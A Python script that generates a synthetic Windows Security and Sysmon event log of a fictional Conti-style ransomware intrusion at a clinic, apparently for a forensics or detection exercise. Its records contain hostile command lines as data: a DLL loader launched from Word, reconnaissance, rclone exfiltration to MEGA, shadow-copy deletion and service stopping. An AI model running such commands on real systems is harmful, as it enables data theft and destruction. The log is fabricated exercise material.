"""Write case/events.jsonl: a fictional Conti-style intrusion at Mercy Ridge Clinic (MRC), as a
Windows Security + Sysmon export with a working day's noise. Deterministic: the same file every run.
Descriptive only: log records, no tooling. Usage: python3 tools/make_events.py > case/events.jsonl
"""
import json
import random
from datetime import datetime, timedelta

rnd = random.Random(2265)
T0 = datetime(2026, 9, 14, 7, 0, 0)          # Monday 07:00 UTC
events = []

def add(sec, host, channel, eid, **f):
    t = T0 + timedelta(seconds=int(sec))
    events.append({"UtcTime": t.strftime("%Y-%m-%d %H:%M:%S"), "Computer": host, "Channel": channel, "EventID": eid, **f})

def proc(sec, host, image, cmd, parent, user):
    add(sec, host, "Sysmon", 1, Image=image, CommandLine=cmd, ParentImage=parent, User=user)

def net(sec, host, image, ip, name, port=443):
    add(sec, host, "Sysmon", 3, Image=image, DestinationIp=ip, DestinationHostname=name, DestinationPort=port)

H = 3600
WS = {"MRC-WS07": "MRC\\l.hayes", "MRC-WS11": "MRC\\r.okafor", "MRC-WS19": "MRC\\t.brandt", "MRC-WS23": "MRC\\a.silva"}
SYS = "NT AUTHORITY\\SYSTEM"
CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
TEAMS = "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"
ONEDRIVE = "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe"

# --- noise: two working days ---
for h, u in WS.items():
    t = 0
    while t < 34 * H:
        t += rnd.randint(200, 2400)
        net(t, h, CHROME, "192.0.2.%d" % rnd.randint(10, 250), rnd.choice(["portal.mercyridge.example", "news.example.org", "cdn.example.net"]))
        if rnd.random() < 0.3:
            proc(t, h, rnd.choice([CHROME, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"]), "app", "C:\\Windows\\explorer.exe", u)
    # OneDrive checks in exactly every 10 minutes: regular, but a known product and a known service
    for k in range(0, 34 * 6):
        net(k * 600 + 13, h, ONEDRIVE, "203.0.113.200", "g.live.example.com")
for k in range(400):
    h = rnd.choice(list(WS) + ["MRC-FS01", "MRC-DC01", "MRC-EHR01"])
    proc(rnd.uniform(0, 34 * H), h, "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs", "C:\\Windows\\System32\\services.exe", SYS)
# A colleague opens a real lab report the same morning (not malicious: no child process)
proc(1.6 * H, "MRC-WS19", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     '"WINWORD.EXE" /n "C:\\Users\\t.brandt\\Documents\\Lab_Results_Q3.docx"', "C:\\Windows\\explorer.exe", "MRC\\t.brandt")

# --- the intrusion ---
U = "MRC\\l.hayes"
D = 2.25 * H                                   # 09:15
WORD = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
proc(D, "MRC-WS07", WORD, '"WINWORD.EXE" /n "C:\\Users\\l.hayes\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q8ZT\\Patient_Referral_0914.doc"',
     "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", U)
proc(D + 40, "MRC-WS07", "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\Public\\Libraries\\srv.dll,StartW", WORD, U)
C2 = "198.51.100.77"
t = D + 55
while t < 34 * H:                              # the loader's beacon: about 60 s, +-10 % jitter
    net(t, "MRC-WS07", "C:\\Windows\\System32\\rundll32.exe", C2, "cdn-updates.example.net")
    t += 60 * rnd.uniform(0.9, 1.1)
proc(D + 0.9 * H, "MRC-WS07", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c nltest /dclist:mrc.local", "C:\\Windows\\System32\\rundll32.exe", U)
proc(D + 1.0 * H, "MRC-WS07", "C:\\Users\\Public\\Libraries\\adfind.exe", "adfind.exe -f objectcategory=computer -csv name",
     "C:\\Windows\\System32\\cmd.exe", U)
add(D + 1.4 * H, "MRC-WS07", "Sysmon", 10, SourceImage="C:\\Windows\\System32\\rundll32.exe", TargetImage="C:\\Windows\\System32\\lsass.exe", GrantedAccess="0x1010")
# Zerologon: the DC's machine account is reset by an anonymous logon
add(D + 3 * H, "MRC-DC01", "Security", 4742, TargetUserName="MRC-DC01$", SubjectUserName="ANONYMOUS LOGON", IpAddress="10.40.0.57")
add(D + 3.1 * H, "MRC-DC01", "Security", 4624, TargetUserName="Administrator", IpAddress="10.40.0.57", LogonType=3)
A = "MRC\\Administrator"
for n, tgt in enumerate(["MRC-FS01", "MRC-EHR01", "MRC-WS11", "MRC-WS23"]):
    s = D + 4 * H + n * 600
    add(s, tgt, "Security", 4624, TargetUserName="Administrator", IpAddress="10.40.0.57", LogonType=3)
    proc(s + 5, tgt, "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\System32\\services.exe", SYS)
proc(D + 5 * H, "MRC-FS01", "C:\\ProgramData\\r\\rclone.exe", "rclone.exe copy E:\\Clinical mega:mrc-0914 --max-age 1y -q", "C:\\Windows\\PSEXESVC.exe", SYS)
for k in range(40):
    net(D + 5 * H + 30 + k * 90, "MRC-FS01", "C:\\ProgramData\\r\\rclone.exe", "198.51.100.150", "gfs302n122.userstorage.mega.co.nz")

# Next night: deployment. MRC-WS19 is a laptop that was at home, so it escapes.
X = 19 * H                                     # the encryptor runs at 02:00 on Tuesday
for n, h in enumerate(["MRC-FS01", "MRC-EHR01", "MRC-WS07", "MRC-WS11", "MRC-WS23"]):
    s = X + n * 45
    proc(s, h, "C:\\ProgramData\\x64.exe", "x64.exe -m all -nomutex", "C:\\Windows\\PSEXESVC.exe" if h != "MRC-WS07" else "C:\\Windows\\System32\\rundll32.exe", SYS)
    proc(s + 3, h, "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c vssadmin delete shadows /all /quiet", "C:\\ProgramData\\x64.exe", SYS)
    proc(s + 4, h, "C:\\Windows\\System32\\net.exe", "net stop MSSQLSERVER /y", "C:\\ProgramData\\x64.exe", SYS)
    for i, d in enumerate(["referrals\\R-20931.pdf", "billing\\2026-08.xlsx", "imaging\\ct-4471.dcm", "HR\\rota-sept.docx"]):
        add(s + 10 + i, h, "Sysmon", 11, Image="C:\\ProgramData\\x64.exe", TargetFilename="C:\\Data\\%s.CONTI" % d)
    add(s + 20, h, "Sysmon", 11, Image="C:\\ProgramData\\x64.exe", TargetFilename="C:\\Data\\readme.txt")

events.sort(key=lambda e: (e["UtcTime"], e["Computer"], e["EventID"]))
for i, e in enumerate(events, start=50001):
    print(json.dumps({"RecordID": i, **e}, separators=(",", ":")))
